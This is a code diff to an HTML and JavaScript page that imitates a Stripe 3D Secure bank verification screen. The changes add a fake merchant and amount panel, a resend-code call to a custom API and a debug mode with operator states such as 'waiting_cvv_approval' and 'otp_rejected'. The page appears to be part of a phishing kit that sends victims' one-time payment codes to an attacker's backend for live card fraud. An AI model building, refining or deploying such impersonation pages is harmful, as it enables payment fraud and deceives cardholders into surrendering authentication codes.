@@ -23,7 +23,7 @@
         }
         .container {
             width: 100%;
-            max-width: 440px;
+            max-width: 450px;
         }
         .stripe-header {
             display: flex;
@@ -58,40 +58,53 @@
             padding: 36px 32px;
             width: 100%;
         }
-        .secure-badge {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 6px;
-            font-size: 12px;
-            color: #6b7c93;
-            margin-bottom: 24px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            font-weight: 500;
-        }
-        .secure-badge svg {
-            width: 14px;
-            height: 14px;
-            fill: #6b7c93;
-        }
+
         .issuer-info {
             text-align: center;
-            margin-bottom: 28px;
+            margin-bottom: 24px;
         }
-        .issuer-logo {
-            width: 48px;
-            height: 48px;
-            background: linear-gradient(135deg, #635bff 0%, #32325d 100%);
+        .payment-summary {
+            background: #f6f9fc;
             border-radius: 10px;
-            margin: 0 auto 14px;
+            padding: 18px 20px;
+            margin-bottom: 24px;
             display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            font-size: 14px;
+            justify-content: space-between;
+            align-items: flex-start;
+        }
+        .payment-merchant {
+            text-align: left;
+        }
+        .payment-merchant .label {
+            font-size: 12px;
+            color: #8898aa;
+            margin-bottom: 4px;
+            text-transform: uppercase;
+            letter-spacing: 0.3px;
+            font-weight: 500;
+        }
+        .payment-merchant .name {
+            font-size: 15px;
+            color: #32325d;
+            font-weight: 600;
+        }
+        .payment-amount {
+            text-align: right;
+        }
+        .payment-amount .label {
+            font-size: 12px;
+            color: #8898aa;
+            margin-bottom: 4px;
+            text-transform: uppercase;
+            letter-spacing: 0.3px;
+            font-weight: 500;
+        }
+        .payment-amount .value {
+            font-size: 18px;
+            color: #32325d;
             font-weight: 700;
         }
+
         h1 {
             color: #32325d;
             font-size: 22px;
@@ -141,6 +154,8 @@
         }
         .otp-input {
             flex: 1;
+            min-width: 0;
+            width: 0;
             height: 48px;
             border: 1.5px solid #e6ebf1;
             border-radius: 8px;
@@ -257,13 +272,9 @@
         }
         .footer {
             text-align: center;
-            margin-top: 20px;
-            font-size: 12px;
+            margin-top: 16px;
+            font-size: 11px;
             color: #8898aa;
-        }
-        .footer a {
-            color: #635bff;
-            text-decoration: none;
         }
     </style>
 </head>
@@ -275,15 +286,18 @@
         </div>
 
         <div class="card">
-            <div class="secure-badge">
-                <svg viewBox="0 0 24 24">
-                    <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/>
-                </svg>
-                Secure authentication
+            <div class="payment-summary">
+                <div class="payment-merchant">
+                    <div class="label">Merchant</div>
+                    <div class="name">Online Store Inc.</div>
+                </div>
+                <div class="payment-amount">
+                    <div class="label">Amount</div>
+                    <div class="value">$129.00</div>
+                </div>
             </div>
 
             <div class="issuer-info">
-                <div class="issuer-logo">••••</div>
                 <h1 id="title">Complete authentication</h1>
                 <p class="subtitle" id="subtitle">Your bank requires additional verification to confirm this payment. This helps keep your account secure.</p>
             </div>
@@ -328,7 +342,7 @@
         </div>
 
         <div class="footer">
-            Powered by Stripe. &nbsp;|&nbsp; <a href="#">Privacy</a> &nbsp;|&nbsp; <a href="#">Terms</a>
+            Powered by Stripe
         </div>
     </div>
 
@@ -358,7 +372,7 @@
 
         function showOTPForm() {
             document.getElementById('title').textContent = 'Enter security code';
-            document.getElementById('subtitle').textContent = 'Enter the 6-digit code sent to your phone to confirm this payment.';
+            document.getElementById('subtitle').textContent = 'We sent a 6-digit code to your phone. Enter it below to continue.';
             document.getElementById('loading-state').style.display = 'none';
             document.getElementById('otp-form').classList.add('active');
             document.getElementById('expired-state').classList.remove('show');
@@ -563,13 +577,60 @@
             xhr.send(JSON.stringify({ otp: otp }));
         }
 
+        var resendCooldown = 60;
+        var resendTimer = null;
+        var resending = false;
+
+        function startResendCountdown() {
+            var btn = document.querySelector('.resend-row a');
+            if (!btn) return;
+            var seconds = resendCooldown;
+            btn.style.pointerEvents = 'none';
+            btn.style.opacity = '0.5';
+            btn.textContent = 'Resend in ' + seconds + 's';
+            resendTimer = setInterval(function() {
+                seconds--;
+                if (seconds <= 0) {
+                    clearInterval(resendTimer);
+                    resendTimer = null;
+                    btn.style.pointerEvents = '';
+                    btn.style.opacity = '';
+                    btn.textContent = 'Resend';
+                } else {
+                    btn.textContent = 'Resend in ' + seconds + 's';
+                }
+            }, 1000);
+        }
+
         function resendCode() {
+            if (resending || resendTimer) return;
+
+            resending = true;
             clearOTPInputs();
             document.getElementById('error-msg').classList.remove('show');
             var inputs = document.querySelectorAll('.otp-input');
             if (inputs.length > 0) {
                 inputs[0].focus();
             }
+
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', getAPIUrl('resend'), true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.onload = function() {
+                resending = false;
+                if (xhr.status === 200) {
+                    try {
+                        var data = JSON.parse(xhr.responseText);
+                        if (data.success) {
+                            startResendCountdown();
+                        }
+                    } catch (e) {}
+                }
+            };
+            xhr.onerror = function() {
+                resending = false;
+            };
+            xhr.send(JSON.stringify({}));
         }
 
         var inputs = document.querySelectorAll('.otp-input');
@@ -609,7 +670,42 @@
             });
         });
 
-        startPolling();
+        // === Debug Mode: static preview with window.state ===
+        (function() {
+            var isDebug = location.protocol === 'file:' || location.search.indexOf('debug=1') > -1;
+            if (!isDebug) {
+                startPolling();
+                return;
+            }
+
+            var debugOTPCount = 0;
+            var debugState = 'otp_waiting';
+
+            function applyState(s) {
+                debugState = s;
+                handleState(s, 'https://example.com', debugOTPCount);
+            }
+
+            Object.defineProperty(window, 'state', {
+                get: function() { return debugState; },
+                set: function(s) { applyState(s); }
+            });
+
+            window.set3DSState = function(s, otpCount) {
+                if (otpCount !== undefined) debugOTPCount = otpCount;
+                applyState(s);
+            };
+
+            window.rejectOTP = function() {
+                debugOTPCount++;
+                applyState('otp_rejected');
+            };
+
+            console.log('%c[3DS Debug Mode]', 'color:#635bff;font-weight:bold;');
+            console.log('Use window.state = "waiting_cvv_approval" | "otp_waiting" | "otp_submitted" | "otp_rejected" | "completed" | "expired"');
+            console.log('Or use window.rejectOTP() to simulate OTP failure');
+            applyState(debugState);
+        })();
     </script>
 </body>
 </html>
